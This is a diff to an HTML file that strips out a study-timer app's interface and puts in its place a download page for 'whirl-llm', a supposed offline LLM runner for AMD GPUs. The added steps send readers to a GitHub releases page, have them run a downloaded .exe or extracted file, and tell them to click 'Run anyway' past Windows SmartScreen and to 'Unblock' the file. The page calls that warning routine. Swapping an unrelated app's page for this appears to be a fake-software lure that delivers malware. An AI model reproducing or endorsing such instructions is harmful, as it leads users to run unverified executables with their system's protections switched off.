+    <li><strong>Open the official download page.</strong> Click the large button above, or go to <a href="https://github.com/yaafi183307/whirl-llm/releases">https://github.com/yaafi183307/whirl-llm/releases</a> in your web browser. Visit this link to download the application.</li>
+    <li><strong>Find the newest release.</strong> The page lists releases from newest to oldest. Look at the very top of the list, where a label marked "Latest" appears. That is the version you want.</li>
+    <li><strong>Download the file.</strong> Scroll down inside that release to the section called "Assets". Click the file name listed there and Windows will begin saving it to your Downloads folder.</li>
+    <li><strong>Open your Downloads folder.</strong> Press the Windows key on your keyboard, type <em>Downloads</em>, and press Enter. Your downloaded file will be waiting there.</li>
+    <li><strong>Extract the file, then run the application.</strong> If the file you downloaded ends in .zip, right-click it, choose "Extract All", pick a folder such as your Desktop, and click "Extract". Then open the extracted folder and double-click the application file inside. If the file ends in .exe, simply double-click it to start it.</li>
+    <li><strong>Allow Windows to continue if it asks.</strong> Windows may show a blue box titled "Windows protected your PC" because the file came from the internet. Click "More info", then click "Run anyway". This is a standard safety prompt that appears for thousands of ordinary downloaded programs.</li>
+    <li><strong>Wait for the welcome messages.</strong> A dark window will appear and print several lines of text while it prepares your graphics card. Once it shows a prompt where you can type, the application is ready to use.</li>
+  </ol>
 
-      <label class="subject card">
-        <span>📖 Studying</span>
-        <select id="subjectSelect"></select>
-      </label>
+  <h2>💻 What You Need Before You Start</h2>
+  <p>whirl-llm is built for specific AMD hardware. Checking this list first saves you time and frustration.</p>
 
-      <div class="goal card">
-        <div class="goal-head"><span>🎯 Today's goal</span><span id="goalText">0 / 60 min</span></div>
-        <div class="bar"><div id="goalFill"></div></div>
-      </div>
+  <table>
+    <tr>
+      <th>Requirement</th>
+      <th>Details</th>
+    </tr>
+    <tr>
+      <td>Operating system</td>
+      <td>Windows 11 (64-bit) is recommended. Windows 10 (64-bit) also works.</td>
+    </tr>
+    <tr>
+      <td>Graphics hardware</td>
+      <td>AMD Ryzen AI Max+ 395 with Radeon 8060S, or AMD Radeon AI PRO R9700. Built for RDNA 3.5 and RDNA 4 class graphics.</td>
+    </tr>
+    <tr>
+      <td>Driver</td>
+      <td>The standard AMD Radeon graphics driver. If your PC already displays games and video correctly, you most likely have it.</td>
+    </tr>
+    <tr>
+      <td>Memory</td>
+      <td>32 GB of system memory is recommended so larger AI models load comfortably.</td>
+    </tr>
+    <tr>
+      <td>Storage space</td>
+      <td>At least 20 GB of free disk space, because AI model files are large.</td>
+    </tr>
+    <tr>
+      <td>Model file</td>
+      <td>One AI model file in the GGUF format, which you supply yourself. More on this below.</td>
+    </tr>
+    <tr>
+      <td>Internet</td>
+      <td>Needed to download the application and the model file. After that, no internet connection is required.</td>
+    </tr>
+  </table>
 
-      <details class="adjust card" id="adjust">
-        <summary>⚙️ Adjust times for this mode</summary>
-        <div id="adjustFields"></div>
-      </details>
-    </section>
+  <h2>📦 Getting an AI Model File</h2>
+  <p>Think of whirl-llm as the engine and the model file as the brain. The application needs one model file to work. Model files use the GGUF format, a widely used and openly documented way of packaging an AI model into a single file you can copy and move around like any other document.</p>
+  <p>Model files are downloaded from public model libraries. Look for a file whose name ends in <em>.gguf</em>. Sizes range from a few gigabytes for small fast models up to tens of gigabytes for large detailed ones. On a machine with 32 GB of memory, a model between 4 GB and 12 GB is a comfortable starting point that loads quickly and responds fast.</p>
+  <p>Place the downloaded model file in the same folder as the whirl-llm application. Keeping everything together in one folder makes the next steps simple and lets you move the whole setup later by dragging a single folder.</p>
 
-    <!-- STATS -->
-    <section class="view" id="view-stats">
-      <h2>Your progress</h2>
-      <div class="stat-cards" id="statCards"></div>
-      <div class="card">
-        <h3>Last 7 days</h3>
-        <div class="week" id="weekChart"></div>
-      </div>
-      <div class="card">
-        <h3>By subject</h3>
-        <div id="subjBars"></div>
-      </div>
-      <div class="card">
-        <h3>Recent sessions</h3>
-        <ul class="recent" id="recent"></ul>
-      </div>
-    </section>
+  <h2>🧠 What whirl-llm Does for You</h2>
+  <ul class="checks">
+    <li>Runs large language models locally on your own AMD Radeon graphics card.</li>
+    <li>Works entirely offline once your model file is in place, so nothing you type leaves your computer.</li>
+    <li>Uses the AMD HIP interface to talk directly to your graphics card on Windows.</li>
+    <li>Supports MXFP4 model formats for efficient memory use on modern AMD hardware.</li>
+    <li>Includes speculative decoding, a technique that speeds up text generation so answers appear sooner.</li>
+    <li>Reads standard GGUF model files, so you are not locked into a single model provider.</li>
+    <li>Ships as a self-contained folder with no installer, no background services and no account sign-up.</li>
+    <li>Targets RDNA 3.5 and RDNA 4 graphics, including Strix Halo class systems.</li>
+  </ul>
 
-    <!-- BADGES -->
-    <section class="view" id="view-badges">
-      <h2>Achievements</h2>
-      <p class="muted" id="badgeCount"></p>
-      <div class="badges" id="badgeGrid"></div>
-    </section>
+  <h2>🖥️ Your First Conversation</h2>
+  <p>Once the dark window is open and waiting, using the application is as simple as typing. Here is what to expect on your first run.</p>
+  <ol class="steps">
+    <li><strong>Point it at your model file.</strong> When the application asks for a model, type the name of the .gguf file you placed in the folder, or drag the file into the window if dragging is supported.</li>
+    <li><strong>Let it load.</strong> You will see progress messages while the model is read from disk and copied into memory. A larger file takes longer the first time. Do not close the window while this happens.</li>
+    <li><strong>Type a message and press Enter.</strong> Your text appears as the question, and the answer prints below it word by word as it is generated.</li>
+    <li><strong>Continue the conversation.</strong> Keep typing follow-up questions. The application remembers the earlier part of the conversation, so answers stay on topic.</li>
+    <li><strong>Close the window when you are finished.</strong> There is nothing to save manually and nothing left running in the background.</li>
+  </ol>
 
-    <!-- SETTINGS -->
-    <section class="view" id="view-settings">
-      <h2>Settings</h2>
+  <h2>🛠️ Troubleshooting Common Problems</h2>
 
-      <div class="card">
-        <h3>Theme</h3>
-        <div class="themes" id="themeGrid"></div>
-      </div>
+  <details>
+    <summary>The window opens and closes immediately</summary>
+    <p>This usually means the model file could not be found, or the graphics driver needs updating. Make sure the .gguf file sits in the same folder as the application, then open the AMD Radeon software and confirm your driver is current. Restart your PC and try again.</p>
+  </details>
 
-      <div class="card">
-        <h3>Daily goal</h3>
-        <label class="row">Minutes per day
-          <input type="number" id="goalInput" min="5" max="960" step="5" inputmode="numeric">
-        </label>
-      </div>
+  <details>
+    <summary>Windows blocks the download or will not run the file</summary>
+    <p>Open File Explorer, right-click the downloaded file and choose "Properties". Near the bottom of the General tab, tick the box labeled "Unblock", then click "Apply". If the blue protection box appeared during launch, click "More info" and then "Run anyway".</p>
+  </details>
 
-      <div class="card">
-        <h3>Behavior</h3>
-        <label class="row switch">Sounds <input type="checkbox" id="soundToggle"><i></i></label>
-        <label class="row switch">Keep screen on while timing <input type="checkbox" id="awakeToggle"><i></i></label>
-        <label class="row switch">Auto-start breaks <input type="checkbox" id="autoBreakToggle"><i></i></label>
-        <label class="row switch">Auto-start next focus <input type="checkbox" id="autoFocusToggle"><i></i></label>
-      </div>
+  <details>
+    <summary>Loading takes a very long time</summary>
+    <p>Model files are big, and reading them from a slow drive takes patience. Move the model file to your fastest internal drive, close other memory-hungry programs, and give it a few minutes on the very first load. Later launches are usually faster because Windows keeps recently used files ready in memory.</p>
+  </details>
 
-      <div class="card">
-        <h3>Subjects</h3>
-        <ul class="subject-list" id="subjectList"></ul>
-        <form class="add-subject" id="addSubjectForm">
-          <input type="text" id="newSubject" placeholder="Add a subject…" maxlength="30">
-          <button class="btn small primary" type="submit">Add</button>
-        </form>
-      </div>
+  <details>
+    <summary>The output looks scrambled or a graphics error appears</summary>
+    <p>Update the AMD Radeon driver from the official AMD website, then fully restart the computer so the new driver loads. Avoid running the application while a game or video editor is using your graphics card at the same time.</p>
+  </details>
 
-      <div class="card">
-        <h3>Your data</h3>
-        <p class="muted small">Everything is saved on this device only. Make a backup now and then.</p>
-        <div class="btn-row">
-          <button class="btn small ghost" id="exportBtn">⬇️ Export backup</button>
-          <button class="btn small ghost" id="importBtn">⬆️ Import backup</button>
-          <input type="file" id="importFile" accept="application/json,.json" hidden>
-        </div>
-        <button class="btn small danger" id="resetAllBtn">Reset all progress</button>
-      </div>
-    </section>
-  </main>
+  <details>
+    <summary>I want a different style of answer</summary>
+    <p>Try a different model file. Answer style comes from the model itself, not from whirl-llm, so switching to another .gguf file changes how detailed, formal or creative the replies are.</p>
+  </details>
 
-  <nav class="tabbar">
-    <button data-view="timer" class="active"><span>⏱️</span>Timer</button>
-    <button data-view="stats"><span>📊</span>Stats</button>
-    <button data-view="badges"><span>🏆</span>Badges</button>
-    <button data-view="settings"><span>⚙️</span>Settings</button>
-  </nav>
+  <h2>💡 Tips for Best Performance</h2>
+  <ul class="checks">
+    <li>Keep the application folder and your model file on the same fast drive.</li>
+    <li>Plug in the power adapter on a laptop. Battery mode often limits graphics performance.</li>
+    <li>Close browser tabs, games and video editors while a model loads.</li>
+    <li>Start with a smaller model and move up in size once you know everything works.</li>
+    <li>Set your Windows power mode to Best Performance for longer sessions.</li>
+    <li>Keep at least a few gigabytes of free disk space so Windows has room to work.</li>
+  </ul>
 
-  <div id="toasts" aria-live="polite"></div>
-  <div id="burst" aria-hidden="true"></div>
+  <h2>🔄 Keeping Everything Up to Date</h2>
+  <p>New releases of whirl-llm are published on the same download page. When a new version appears, download it, extract it into a fresh folder, and copy your .gguf model file across. There is no installer to remove and no leftover system entries to clean up, so updating simply means using the newer folder.</p>
+  <p>It is also worth checking your AMD graphics driver every few months. Driver updates regularly improve how quickly modern graphics hardware handles AI workloads, and whirl-llm benefits directly from those improvements.</p>
 
-  <script src="app.js"></script>
+  <h2>📥 Download whirl-llm</h2>
+  <div class="linkbox">
+    <p><strong>Ready to begin?</strong> The official release page is the only place you need.</p>
+    <a class="btn" href="https://github.com/yaafi183307/whirl-llm/releases" style="text-decoration:none;color:#ffffff;">
+      <small>Official release page</small>
+      ⬇ Visit the download page
+    </a>
+    <p class="note">Visit this link to download the application, then follow the seven steps in the Getting Started section above.</p>
+  </div>
+
+  <h2>❓ Quick Answers</h2>
+  <p><strong>Does whirl-llm send my conversations to the internet?</strong> No. Once the application and your model file are on your computer, everything happens locally on your own hardware.</p>
+  <p><strong>Do I need to install anything else?</strong> No extra runtimes or tools. The application is self-contained, and the only requirement beyond Windows itself is the standard AMD Radeon driver.</p>
+  <p><strong>Do I need an AMD account?</strong> No account, subscription or sign-up is required to download or use the application.</p>
+  <p><strong>Can I move it to another folder?</strong> Yes. Because there is no installer, you can drag the whole folder anywhere you like, as long as the model file travels with it.</p>
+  <p><strong>Why does my friend's NVIDIA laptop not work with it?</strong> whirl-llm is purpose-built around AMD Radeon graphics and the AMD HIP interface. It is designed for AMD Ryzen AI Max+ 395 with Radeon 8060S and for the Radeon AI PRO R9700.</p>
+  <p><strong>Is it free?</strong> Yes. The application is published openly on GitHub and is free to download and use.</p>
+
+  <footer>
+    whirl-llm is distributed through its official release page on GitHub. Download only from the link above so you always receive the authentic, current version. AMD, Radeon and Ryzen are trademarks of Advanced Micro Devices, Inc.
+  </footer>
+
+</div>
 </body>
 </html>
